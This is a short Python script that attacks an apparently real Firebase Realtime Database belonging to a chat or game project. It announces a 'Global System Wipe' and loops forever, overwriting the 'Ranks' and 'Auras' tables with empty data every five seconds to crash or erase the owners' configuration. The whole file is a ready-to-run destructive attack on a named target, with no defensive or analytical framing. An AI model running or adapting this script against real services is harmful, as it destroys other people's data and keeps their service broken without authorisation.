import time
import requests

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"
ranks_url = f"{database_url}/Ranks.json"
auras_url = f"{database_url}/Auras.json"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Initializing Global System Wipe...")

session = requests.Session()

while True:
    try:
        # Overwrite global tables with null/empty data to crash or wipe script configs
        session.put(ranks_url, json={}, headers=headers, timeout=3)
        session.put(auras_url, json={}, headers=headers, timeout=3)
        
        print("[FORBID] Global config wiped successfully!")
        
    except Exception as e:
        print(f"[FORBID] Wipe error: {e}")
        
    time.sleep(5)
